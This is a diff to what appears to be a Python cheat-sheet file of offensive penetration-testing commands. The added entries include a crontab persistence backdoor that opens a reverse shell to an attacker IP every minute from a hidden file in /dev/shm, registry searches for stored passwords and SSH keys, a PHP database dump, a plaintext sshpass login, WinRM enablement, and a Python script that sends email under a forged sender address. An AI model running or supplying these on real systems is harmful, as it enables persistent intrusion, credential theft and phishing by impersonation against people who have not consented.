@@ -1372,12 +1372,16 @@ sudo chisel server -p 8008 --reverse   # port 8008 is the port of the chisel ser
 ######################################
 ######################################
 
-jwt_openssl = Cheat("JWT - openssl")
+jwt_openssl = Cheat("JWT - openssl | get certificate via openssl")
 jwt_openssl.category = "Web"
 jwt_openssl.subCategory = "Cookie"
 jwt_openssl.output = """[*] Generate privKey to manipulate JWT token
 
 openssl genrsa -out privKey.key 2048
+
+[*] Get certificate of a website
+
+openssl s_client -connect 10.10.10.162:443
 """
 
 ######################################
@@ -1693,8 +1697,8 @@ reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
 reg query "HKCU\Software\OpenSSH\Agent\Key"
 
 # Search for passwords inside all the registry
-reg query HKLM /f password /t REG_SZ /s #Look for registries that contains "password"
-reg query HKCU /f password /t REG_SZ /s #Look for registries that contains "password"
+reg query HKLM /f password /t REG_SZ /s #Look for registries in HKLM that contains "password"
+reg query HKCU /f password /t REG_SZ /s #Look for registries in HKCU that contains "password"
 
 [*] With winPEAS.exe
 .\winPEAS.exe quiet filesinfo userinfo
@@ -1805,5 +1809,92 @@ linuxPersistenceReverseShell.category = "Linux"
 linuxPersistenceReverseShell.subCategory = "Reverse Shell"
 linuxPersistenceReverseShell.output = f"""[*] Persistent reverse shell backdoor via crontab
 
-(touch .tab ; echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/{ip}/443 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1
+(touch /dev/shm/.tab ; echo "* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/{ip}/443 0>&1'" >> /dev/shm/.tab ; crontab /dev/shm/.tab ; rm /dev/shm/.tab) > /dev/null 2>&1
+"""
+
+######################################
+######################################
+
+connectDatabaseViaPHP = Cheat("php --interactive - connect to database via php - PDO connection")
+connectDatabaseViaPHP.category = "Tools"
+connectDatabaseViaPHP.subCategory = "Databases"
+connectDatabaseViaPHP.output = """[*] php --interactive - connect to database via php when we have no mysql or similar in target machine
+
+php --interactive
+
+php > $connection = new PDO('mysql:host=localhost;dbname=databasename', 'username', 'password');  # OR
+php > $connection = new PDO('mssql:host=localhost;dbname=databasename', 'username', 'password');  # OR
+php > $connection = new PDO('pgsql:host=localhost;dbname=databasename', 'username', 'password');  # ...
+
+php > $connect = $connection->query("SELECT * FROM profiles");
+php > $result = $connect->fetchAll();
+php > print_r($results);
+"""
+
+######################################
+######################################
+
+sshPassInCMD = Cheat("sshpass - write password in command line on login with sshpass")
+sshPassInCMD.category = "Tools"
+sshPassInCMD.subCategory = "Password"
+sshPassInCMD.output = """[*] sshpass - write password in command line on login with sshpass
+
+sshpass -p 'Passw0rd!' ssh clave@10.10.10.114
+"""
+
+######################################
+######################################
+
+winrmEnable = Cheat("Enable WinRM - Powershell")
+winrmEnable.category = "Windows"
+winrmEnable.subCategory = "WinRM"
+winrmEnable.output = """[*] Quick default configuration of WinRM
+
+winrm quickconfig
+
+[*] Fix WinRM firewall exception
+
+Get-NetConnectionProfile
+Set-NetConnectionProfile -InterfaceIndex 6 -NetworkCategory Private
+
+winrm quickconfig
+"""
+
+######################################
+######################################
+
+sendImpersonatedEmail = Cheat("email - send impersonated email with python")
+sendImpersonatedEmail.category = "Python"
+sendImpersonatedEmail.subCategory = "Email"
+sendImpersonatedEmail.output = """[*] Send an impersonated email via email
+
+sudo apt install sendmail
+
+
+#########################################
+import smtplib
+import os, time
+
+os.system("/etc/init.d/sendmail start")
+time.sleep(4)
+
+HOST = "localhost"
+SUBJECT = "Testing python email"
+TO = "syjulio123@gmail.com"
+FROM = "testingPostMail@hotmail.com"
+TEXT = "This is a test email"
+BODY = "\n".join((
+	f"From: {FROM}",
+	f"To: {TO}",
+	f"Subject: {SUBJECT}",
+	"",
+	TEXT, 
+	"\r\n"))
+
+server = smtplib.SMTP(HOST)
+server.sendmail(FROM, [TO], BODY)
+server.quit()
+
+time.sleep(4)
+os.system("/etc/init.d/sendmail stop")
 """
